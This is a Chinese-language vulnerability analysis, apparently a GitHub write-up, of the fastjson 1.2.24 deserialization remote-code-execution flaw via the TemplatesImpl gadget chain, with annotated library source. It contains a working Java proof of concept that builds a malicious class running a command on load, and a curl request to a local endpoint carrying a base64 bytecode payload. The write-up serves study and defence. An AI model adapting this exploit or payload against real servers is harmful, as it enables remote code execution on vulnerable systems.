
## POC分析
这里先给出一个POC，先基于这个进行分析，之后再用一个demo模拟业务场景。


漏洞成因：fastjson 1.2.24 @type是默认开启的

复现环境：fastjson 1.2.24+jdk 1.8.0_331

```java

package org.apache.maven.archetypes;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;

public class Main {
    public static class test{
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());                    //cc成为了test类的副本，之后铺的修改都围绕着这个副本

        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";

        cc.makeClassInitializer().insertBefore(cmd);                      //把cmd这个放到cc的static代码块中了，只要cc类被加载就会触发

        String randomClassName = "W01fh4cker" + System.nanoTime();      //因为 JVM 的规则：同一个 ClassLoader 下，同一个类名只能加载一次
        cc.setName(randomClassName);                                   //所以每次都换名

        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        //getName()获取类的全名字符串com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
        //pool.get从 Javassist 的 ClassPool 里取出这个类，返回 AbstractTranslet 的 CtClass 对象（可编辑的类模板）
        //.setSuperclass() 设置cc的父类为 AbstractTranslet




        //---------------上部分生成了恶意类-----------------------

        //---------------下部分是恶意代码的反序列化，执行------------
        try {
            byte[] evilCode = cc.toBytecode();//直接生成cc类的字节码，就是.class
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);//编码字节码为base64
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";//定义一个常量，存 TemplatesImpl 的完整类名
            String text1 = "{"+                     //text1都是TemplatesImpl所需要的
                    "\"@type\":\"" + NASTY_CLASS +"\","+
                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                    "'_name':'W01h4cker',"+
                    "'_tfactory':{ },"+             //避免空指针
                    "'_outputProperties':{ }"+      //这一步是触发jvm中加载好的类以触发static代码块
                    "}\n";
            ParserConfig config = new ParserConfig();//new 一个新默认配置，不受全局fastjson配置影响

            //Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            //实际上只要这两个参数就行了
            // TemplatesImpl 链需要 Feature.SupportNonPublicField，因为 _bytecodes 是 private 字段
            Object obj = JSON.parseObject(text1, Feature.SupportNonPublicField);

            //开始反序列化，执行static代码块
            //正常来说用户控制输入的地方只有text1，这个json字段
            //Object.class，返回类型，Object.class指可返回任意类型
            //config，解析器设置，上面的new ParserConfig() 新默认配置
            //Feature.SupportNonPublicField，允许 FastJSON 通过反射设置 private 字段，_bytecodes 是 private，
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

对整个链路的梳理在https://github.com/tiandeyiliushang-sudo/fastjson-1.2.24-TemplatesImpl/blob/main/poc%E5%88%86%E6%9E%90/fastjson.xmind  里，里面有调用类，方法以及解释


接下来一步步进行调试，接下来会以源码+注释的形式分析。


1. fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\JSON.class

```java
 public static <T> T parseObject(String input, Type clazz, ParserConfig config, ParseProcess processor, int featureValues, Feature... features) {
        //Feature... features等价于Feature[] features 是数组
        //featureValues管：解析行为的各种开关
        //int featureValues 的是DEFAULT_PARSER_FEATURE 默认基础设置 989即为 0011 1101 1101，这个是利用二进制串来控制FastJSON 解析器的各种行为开关。
        //config哪些类可以被 @type 指定，config.addAccept("com.sun"); config.addDeny("java.lang.Thread");     // 黑名单




     
     
     
     //以下这部分是在基础设置989之上又添加了SupportNonPublicField（支持对private字段修改）的配置
     if (input == null) {
            return null;
        } else {
            if (features != null) {
                Feature[] var6 = features;	//这个features: Feature[1]，其实就只有Feature.SupportNonPublicField一个元素
                int var7 = features.length;//var7=1

                for(int var8 = 0; var8 < var7; ++var8) {
                    Feature feature = var6[var8];
                    featureValues |= feature.mask;//按位或 添加了SupportNonPublicField（支持对private字段修改）的配置
                }
            }


         //这个地方是初始化解析器域要解析的json(input)，为接下来做准备
         //这里使用默认词法分析将前面传入的 text1  JSON 字符串拆成一个个 token，这时@type 只是一个普通的字符串 key，没有特殊含义
            DefaultJSONParser parser = new DefaultJSONParser(input, config, featureValues);
| 缺少的条件                                         | 结果                |
| --------------------------------------------- 	| ----------------- |
| 缺少 `config` 白名单                               | `@type` 被拦截       |
| 缺少 `featureValues` 中的 `SupportNonPublicField`  | `_bytecodes` 无法赋值 |
| 两者都具备                                         | 漏洞触发              |

         
         
         //processor漏洞利用时设置的都为null，不用管这段
         if (processor != null) {
                if (processor instanceof ExtraTypeProvider) {
                    parser.getExtraTypeProviders().add((ExtraTypeProvider)processor);
                }

                if (processor instanceof ExtraProcessor) {
                    parser.getExtraProcessors().add((ExtraProcessor)processor);
                }

                if (processor instanceof FieldTypeResolver) {
                    parser.setFieldTypeResolver((FieldTypeResolver)processor);
                }
            }

            //这一步是将class加入jvm的关键时期
            T value = parser.parseObject(clazz, (Object)null);
            parser.handleResovleTask(value);
            parser.close();
            return value;
        }
    }
```


2. fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\parser\DefaultJSONParser.class
```java

    public <T> T parseObject(Type type, Object fieldName) {
        int token = this.lexer.token();

        //json  {}  不走4  和  8
        if (token == 8) {////解析 null 值
            this.lexer.nextToken();
            return null;
        } else {
            if (token == 4) {//解析字符串
                if (type == byte[].class) {
                    byte[] bytes = this.lexer.bytesValue();
                    this.lexer.nextToken();
                    return bytes;
                }

                if (type == char[].class) {
                    String strVal = this.lexer.stringVal();
                    this.lexer.nextToken();
                    return strVal.toCharArray();
                }
            }


            //跳到这里
            //准备解析器
            //先暂且给个Object.class通用解析器，解析到@type时再换为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
            ObjectDeserializer derializer = this.config.getDeserializer(type);


            //拿上一步解析好的普通parser，这一步创建一个Object.class默认的通用解析器，对上一步得到的普通parser进行反序列化
            try {
                return derializer.deserialze(this, type, fieldName);
            } 


            //处理异常JSON 格式错误，@type 指定的类找不到。。。。
            catch (JSONException var6) {
                JSONException e = var6;
                throw e;
            } catch (Throwable var7) {
                Throwable e = var7;
                throw new JSONException(e.getMessage(), e);
            }
        }
    }
```


3. fastjson\parser\deserializer\JavaObjectDeserializer.class

```java
public <T> T deserialze(DefaultJSONParser parser, Type type, Object fieldName) {

        //1. 这个if是管数组类型的，我这个是json所以这个大json块直接跳过了
        if (type instanceof GenericArrayType) {
            Type componentType = ((GenericArrayType)type).getGenericComponentType();
            if (componentType instanceof TypeVariable) {
                TypeVariable<?> componentVar = (TypeVariable)componentType;
                componentType = componentVar.getBounds()[0];
            }

            List<Object> list = new ArrayList();
            parser.parseArray(componentType, list);
            if (componentType instanceof Class) {
                Class<?> componentClass = (Class)componentType;
                Object[] array = (Object[])((Object[])Array.newInstance(componentClass, list.size()));
                list.toArray(array);
                return array;
            } else {
                return list.toArray();
            }
        } 
        
        
        //2. 来到这里，进入更深一层的调用链
        else {
            return type instanceof Class && type != Object.class && type != Serializable.class ? parser.parseObject(type) : parser.parse(fieldName);
        //三元运算符
        //type所属类型是类而且是普通类,所以先走通用解析
        //parseObject() 是"按指定类型解析"，parse() 是"先通用解析，遇到 @type 再切换
        //这里parser.parse(fieldName) fieldName是null ，让 FastJSON 自己从 JSON 内容里找@type判断该怎么解析
        //parser.parse(fieldName);这里fieldName为null，实际上还是继续解析parser去了
        }
    }
```


4. fastjson\parser\DefaultJSONParser.class

```java
public Object parse(Object fieldName) {
        JSONLexer lexer = this.lexer;
        switch (lexer.token()) {
            case 1:
            case 5:
            case 10:
            case 11:
            case 13:
            case 15:
            case 16:
            case 17:
            case 18:
            case 19:
            default:
                throw new JSONException("syntax error, " + lexer.info());
            case 2:
                Number intValue = lexer.integerValue();
                lexer.nextToken();
                return intValue;
            case 3:
                Object value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));
                lexer.nextToken();
                return value;
            case 4:
                String stringLiteral = lexer.stringVal();
                lexer.nextToken(16);
                if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) {
                    JSONScanner iso8601Lexer = new JSONScanner(stringLiteral);

                    try {
                        if (iso8601Lexer.scanISO8601DateIfMatch()) {
                            Date var11 = iso8601Lexer.getCalendar().getTime();
                            return var11;
                        }
                    } finally {
                        iso8601Lexer.close();
                    }
                }

                return stringLiteral;
            case 6:
                lexer.nextToken();
                return Boolean.TRUE;
            case 7:
                lexer.nextToken();
                return Boolean.FALSE;
            case 8:
                lexer.nextToken();
                return null;
            case 9:
                lexer.nextToken(18);
                if (lexer.token() != 18) {
                    throw new JSONException("syntax error");
                }

                lexer.nextToken(10);
                this.accept(10);
                long time = lexer.integerValue().longValue();
                this.accept(2);
                this.accept(11);
                return new Date(time);


                //这里传入的是json串  token是12，走这里
                //JSON 串第一个字符是 {，所以 token=12
            case 12:
                //创建一个JVM中的JSONObject容器，这个容器的存储顺序与text1的顺序一致，因为text1中，顺序是安排好的
                //_outputProperties必须放在最后，解析_outputProperties时会触发TemplatesImpl链，加载反序列化的TemplatesImpl类，触发static代码块，弹计算机，这一切的前提是前面的都加载好了，否则进不去TemplatesImpl链了
                //@type必须第一个，FastJSON 需要知道创建什么类
                JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
                
                return this.parseObject((Map)object, fieldName);
                //进入下一环
            case 14:
                JSONArray array = new JSONArray();
                this.parseArray((Collection)array, (Object)fieldName);
                if (lexer.isEnabled(Feature.UseObjectArray)) {
                    return array.toArray();
                }

                return array;
            case 20:
                if (lexer.isBlankInput()) {
                    return null;
                }

                throw new JSONException("unterminated json string, " + lexer.info());
            case 21:
                lexer.nextToken();
                HashSet<Object> set = new HashSet();
                this.parseArray((Collection)set, (Object)fieldName);
                return set;
            case 22:
                lexer.nextToken();
                TreeSet<Object> treeSet = new TreeSet();
                this.parseArray((Collection)treeSet, (Object)fieldName);
                return treeSet;
            case 23:
                lexer.nextToken();
                return null;
        }
    }
```



5. fastjson\parser\DefaultJSONParser.class

```java

public final Object parseObject(Map object, Object fieldName) {
            。
            。
            。
            ch = lexer.getCurrent();
            lexer.resetStringPosition();
            Object obj;
            Object instance;
            String ref;
            Object thisObj;
            //判断 key 是不是 @type，是的话进入
            if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
                ref = lexer.scanSymbol(this.symbolTable, '"');
                Class<?> clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
                if (clazz != null) {
                    lexer.nextToken(16);
                    if (lexer.token() == 13) {
                        lexer.nextToken(16);

                        try {
                            instance = null;
                            ObjectDeserializer deserializer = this.config.getDeserializer(clazz);
                            if (deserializer instanceof JavaBeanDeserializer) {
                                instance = ((JavaBeanDeserializer)deserializer).createInstance(this, clazz);
                            }

                            if (instance == null) {
                                if (clazz == Cloneable.class) {
                                    instance = new HashMap();
                                } else if ("java.util.Collections$EmptyMap".equals(ref)) {
                                    instance = Collections.emptyMap();
                                } else {
                                    instance = clazz.newInstance();
                                }
                            }

                            obj = instance;
                            return obj;
                        } catch (Exception var23) {
                            Exception e = var23;
                            throw new JSONException("create instance error", e);
                        }
                    }

                    this.setResolveStatus(2);
                    if (this.context != null && !(fieldName instanceof Integer)) {
                        this.popContext();
                    }

                    if (object.size() > 0) {
                        instance = TypeUtils.cast(object, clazz, this.config);
                        this.parseObject(instance);
                        thisObj = instance;
                        return thisObj;
                    }
                    //获取com.sun...TemplatesImpl的专属反序列化器
                    ObjectDeserializer deserializer = this.config.getDeserializer(clazz);
                    //这里的this还是parser
                    //用TemplatesImpl专属反序列化器clazz 解析this，从而直接创建 TemplatesImpl 实例并返回
                    thisObj = deserializer.deserialze(this, clazz, fieldName);
                    return thisObj;
                }


```


6. fastjson\parser\deserializer\JavaBeanDeserializer.class

```java
protected <T> T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features) {
    。
    。
    。
     else {
        //这一个类中是，读parser   JSON 字段值 → 准备赋值给 TemplatesImpl 的字段,把 parser 读到的数据反序列化到 TemplatesImpl实例中，逐字段赋值，最终触发漏洞,
        //在这里还是一个个都遍历了，遍历到 _outputProperties 这里的
        boolean match = this.parseField(parser, key, object, type, fieldValues);
        if (!match) {

```


7. fastjson\parser\deserializer\JavaBeanDeserializer.class

```java
    public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType, Map<String, Object> fieldValues) {
        JSONLexer lexer = parser.lexer;
        FieldDeserializer fieldDeserializer = this.smartMatch(key);
        int mask = Feature.SupportNonPublicField.mask;
        if (fieldDeserializer == null && (parser.lexer.isEnabled(mask) || (this.beanInfo.parserFeatures & mask) != 0)) {
            if (this.extraFieldDeserializers == null) {
                ConcurrentHashMap extraFieldDeserializers = new ConcurrentHashMap(1, 0.75F, 1);
                Field[] fields = this.clazz.getDeclaredFields();
                Field[] var11 = fields;
                int var12 = fields.length;

                for(int var13 = 0; var13 < var12; ++var13) {
                    Field field = var11[var13];
                    String fieldName = field.getName();
                    if (this.getFieldDeserializer(fieldName) == null) {
                        int fieldModifiers = field.getModifiers();
                        if ((fieldModifiers & 16) == 0 && (fieldModifiers & 8) == 0) {
                            extraFieldDeserializers.put(fieldName, field);
                        }
                    }
                }

                this.extraFieldDeserializers = extraFieldDeserializers;
            }

            Object deserOrField = this.extraFieldDeserializers.get(key);
            if (deserOrField != null) {
                if (deserOrField instanceof FieldDeserializer) {
                    fieldDeserializer = (FieldDeserializer)deserOrField;
                } else {
                    Field field = (Field)deserOrField;
                    field.setAccessible(true);
                    FieldInfo fieldInfo = new FieldInfo(key, field.getDeclaringClass(), field.getType(), field.getGenericType(), field, 0, 0, 0);
                    fieldDeserializer = new DefaultFieldDeserializer(parser.getConfig(), this.clazz, fieldInfo);
                    this.extraFieldDeserializers.put(key, fieldDeserializer);
                }
            }
        }

        if (fieldDeserializer == null) {
            if (!lexer.isEnabled(Feature.IgnoreNotMatch)) {
                throw new JSONException("setter not found, class " + this.clazz.getName() + ", property " + key);
            } else {
                parser.parseExtra(object, key);
                return false;
            }
        } else {
            lexer.nextTokenWithColon(((FieldDeserializer)fieldDeserializer).getFastMatchToken());

            //根据key = "_outputProperties"进入下一阶段
            ((FieldDeserializer)fieldDeserializer).parseField(parser, object, objectType, fieldValues);
            return true;
        }
    }

```

8. fastjson\parser\deserializer\DefaultFieldDeserializer.class

```java
public void parseField(DefaultJSONParser parser, Object object, Type objectType, Map<String, Object> fieldValues) {
        if (this.fieldValueDeserilizer == null) {
            this.getFieldValueDeserilizer(parser.getConfig());
        }

        Type fieldType = this.fieldInfo.fieldType;
        if (objectType instanceof ParameterizedType) {
            ParseContext objContext = parser.getContext();
            if (objContext != null) {
                objContext.type = objectType;
            }

            fieldType = FieldInfo.getFieldType(this.clazz, objectType, fieldType);
            this.fieldValueDeserilizer = parser.getConfig().getDeserializer(fieldType);
        }

        Object value;
        if (this.fieldValueDeserilizer instanceof JavaBeanDeserializer) {
            JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer)this.fieldValueDeserilizer;
            value = javaBeanDeser.deserialze(parser, fieldType, this.fieldInfo.name, this.fieldInfo.parserFeatures);
        } else if (this.fieldInfo.format != null && this.fieldValueDeserilizer instanceof ContextObjectDeserializer) {
            value = ((ContextObjectDeserializer)this.fieldValueDeserilizer).deserialze(parser, fieldType, this.fieldInfo.name, this.fieldInfo.format, this.fieldInfo.parserFeatures);
        } else {
            value = this.fieldValueDeserilizer.deserialze(parser, fieldType, this.fieldInfo.name);
        }

        if (parser.getResolveStatus() == 1) {
            DefaultJSONParser.ResolveTask task = parser.getLastResolveTask();
            task.fieldDeserializer = this;
            task.ownerContext = parser.getContext();
            parser.setResolveStatus(0);
        } else if (object == null) {
            fieldValues.put(this.fieldInfo.name, value);
        } else {

            //当this.fieldValueDeserilizer循环到JavaBeanDeserializer时，也就是到了解析_outputProperties时
            //setValue(object, value)给创建的TemplatesImpl类赋值的核心语句
            //object是TemplatesImpl， value则是具体的每个字段
            this.setValue(object, value);
        }

    }



```


9. fastjson\parser\deserializer\FieldDeserializer.class

这里调试到_outputProperties 时，就会触发Map map = (Map)method.invoke(object);，进入TemplatesImpl链了。
一定要结合xmind去看。

![outputProperties 调试](https://raw.githubusercontent.com/tiandeyiliushang-sudo/fastjson-1.2.24-TemplatesImpl/main/poc%E5%88%86%E6%9E%90/_outputProperties%20%E8%B0%83%E8%AF%95.png)

```java

public void setValue(Object object, Object value) {
    if (value != null || !this.fieldInfo.fieldClass.isPrimitive()) {
        try {
            //这里获得的method就是TemplatesImpl.getOutputProperties()
            Method method = this.fieldInfo.method;
            if (method != null) {
                if (this.fieldInfo.getOnly) {
                    if (this.fieldInfo.fieldClass == AtomicInteger.class) {
                        AtomicInteger atomic = (AtomicInteger)method.invoke(object);
                        if (atomic != null) {
                            atomic.set(((AtomicInteger)value).get());
                        }
                    } else if (this.fieldInfo.fieldClass == AtomicLong.class) {
                        AtomicLong atomic = (AtomicLong)method.invoke(object);
                        if (atomic != null) {
                            atomic.set(((AtomicLong)value).get());
                        }
                    } else if (this.fieldInfo.fieldClass == AtomicBoolean.class) {
                        AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);
                        if (atomic != null) {
                            atomic.set(((AtomicBoolean)value).get());
                        }

                        
                        // Properties 继承 Hashtable 继承 Map，所以走这里！
                    } else if (Map.class.isAssignableFrom(method.getReturnType())) {
                        //真正的爆发点，这一步过后计算机将弹出
                        //接下来将进入TemplatesImpl.getOutputProperties()，触发TemplatesImpl 链
                        Map map = (Map)method.invoke(object);
                        if (map != null) {
                            map.putAll((Map)value);
                        }
                    } else {
                        Collection collection = (Collection)method.invoke(object);
                        if (collection != null) {
                            collection.addAll((Collection)value);
                        }
                    }
                } else {
                    method.invoke(object, value);
                }
```

## 实际场景模拟 

接下来进行一个贴近实际场景点的分析

```java
Object result = JSON.parseObject(requestBody,Feature.SupportNonPublicField);
//开发者可能会因为1. 省去写 setter 的麻烦2.别人写的 jar 包里的类，字段是 private 的，没有 setter，而使用Feature.SupportNonPublicField
```

这一句就是漏洞触发的根源，Feature.SupportNonPublicField是为了修改 private _bytecodes的，TemplatesImpl本身就没setter，所以想用修改_bytecodes，就只能寄希望于Feature.SupportNonPubl

icField. _bytecodes 是字节码，字节码最后反序列化为jvm中的恶意类，加载恶意类时触发static代码块，实现rce

```text
curl -X POST "http://localhost:8888/api/user/info" -H "Content-Type: application/json" -d "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAnTG9yZy9hcGFjaGUvbWF2ZW4vYXJjaGV0eXBlcy9NYWluJHRlc3Q7AQAKU291cmNlRmlsZQEACU1haW4uamF2YQwABAAFBwATAQAlb3JnL2FwYWNoZS9tYXZlbi9hcmNoZXR5cGVzL01haW4kdGVzdAEAEGphdmEvbGFuZy9PYmplY3QBACBvcmcvYXBhY2hlL21hdmVuL2FyY2hldHlwZXMvTWFpbgEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAGVcwMWZoNGNrZXIxOTI5MTYzMDkzNjYxMDABABtMVzAxZmg0Y2tlcjE5MjkxNjMwOTM2NjEwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAAMAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=\"],\"_name\":\"W01h4cker\",\"_tfactory\":{},\"_outputProperties\":{}}"
```

![执行结果](https://github.com/tiandeyiliushang-sudo/fastjson-1.2.24-TemplatesImpl/blob/main/poc%E5%88%86%E6%9E%90/%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C.png)
